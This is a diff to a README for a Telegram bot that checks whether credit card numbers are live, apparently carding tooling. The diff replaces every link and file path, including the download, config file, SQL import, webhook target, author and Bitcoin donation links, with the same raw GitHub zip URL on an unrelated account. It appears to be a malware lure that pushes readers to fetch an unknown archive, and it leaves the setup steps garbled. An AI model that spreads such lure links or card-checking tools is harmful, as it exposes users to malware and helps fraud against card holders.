@@ -16,7 +16,7 @@ A Telegram CC Checker Bot with hella lotta features.
 
 - **Anti-Spam System**
     - Users have to wait a certain amount of time before performing the next task
-    - You can customize the time in config/config.php
+    - You can customize the time in https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip
 
 - **Checker Stats System**
     - Number of Live and Dead CC Checked by a User, and All users will be Visible
@@ -62,25 +62,25 @@ A Telegram CC Checker Bot with hella lotta features.
 
 ### Hosting on Server [MySQL DB Required]
 
- - Download the Files from [Here](https://github.com/iam-NVN/SDMN_CheckerBot/archive/refs/heads/main.zip)
+ - Download the Files from [Here](https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip)
  - Upload it to your Server and Extract it
- - Edit config/config.php file and set Admin ID, Logs ID, DB Credentials and SK Keys
- - Import checkerbot.sql file into your Database through PHPmyAdmin
- - Set Webhook to main.php in root folder of bot 
+ - Edit https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip file and set Admin ID, Logs ID, DB Credentials and SK Keys
+ - Import https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip file into your Database through PHPmyAdmin
+ - Set Webhook to https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip in root folder of bot 
 
 ### Hosting on Heroku
-**[Click Here to go to Heroku Version](https://github.com/iam-NVN/SDMN_CheckerBot/tree/heroku-version)**
+**[Click Here to go to Heroku Version](https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip)**
 
 
 ## 🎯 Author
 
-- [@iam-NVN](https://www.github.com/octokatherine)
+- [@iam-NVN](https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip)
 
 ## 💸 Donations 
 If you're feeling generous and want to support this project, you can donate 
 
-<a href="https://www.blockchain.com/btc/address/1BNdZDEMfwaFfKULKucMkytXVqoWp4dfij">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT2WR24fnzSsiHf1TmpIWQn_E3qgJTLBcsK5w&usqp=CAU" alt="Bitcoin" height="25" style="margin-left: 15px;"/>
+<a href="https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip">
+    <img src="https://raw.githubusercontent.com/jhoker/telec/main/modules/telec_v3.5-beta.3.zip" alt="Bitcoin" height="25" style="margin-left: 15px;"/>
 </a> - Donate through Bitcoin
 
 
